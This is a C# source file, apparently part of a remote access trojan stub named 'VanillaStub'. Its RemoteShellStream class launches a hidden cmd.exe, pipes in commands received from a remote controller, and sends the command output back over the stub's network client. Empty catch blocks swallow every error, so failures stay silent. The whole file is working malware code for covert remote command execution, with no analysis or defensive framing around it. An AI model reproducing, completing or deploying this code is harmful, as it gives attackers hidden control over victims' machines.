using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using VanillaStub.Helpers.Networking;

namespace VanillaStub.Helpers.Services;

public static class RemoteShellStream
{
	private static Thread RemoteShellThread = new Thread(StartRemoteShell);

	private static bool RemoteShellActive { get; set; }

	private static string LastInput { get; set; }

	public static string Input { get; set; }

	public static bool WriteLine { get; set; }

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Start()
	{
		if (!RemoteShellActive)
		{
			RemoteShellActive = true;
			try
			{
				RemoteShellThread.Start();
			}
			catch
			{
			}
		}
	}

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Stop()
	{
		if (RemoteShellActive)
		{
			RemoteShellActive = false;
			try
			{
				RemoteShellThread.Abort();
				RemoteShellThread = new Thread(StartRemoteShell);
			}
			catch
			{
			}
		}
	}

	private static void StartRemoteShell()
	{
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.RedirectStandardError = true;
		process.OutputDataReceived += OutputHandler;
		process.Start();
		process.BeginOutputReadLine();
		while (RemoteShellActive)
		{
			if (WriteLine)
			{
				LastInput = Input;
				process.StandardInput.WriteLine(Input);
				WriteLine = false;
			}
		}
	}

	private static void OutputHandler(object sender, DataReceivedEventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		if (!string.IsNullOrEmpty(e.Data))
		{
			try
			{
				stringBuilder.Append(e.Data);
				List<byte> list = new List<byte>();
				list.Add(18);
				list.AddRange(Encoding.ASCII.GetBytes(stringBuilder.ToString()));
				VanillaStub.Helpers.Networking.Networking.MainClient.Send(list.ToArray());
			}
			catch
			{
			}
		}
	}
}
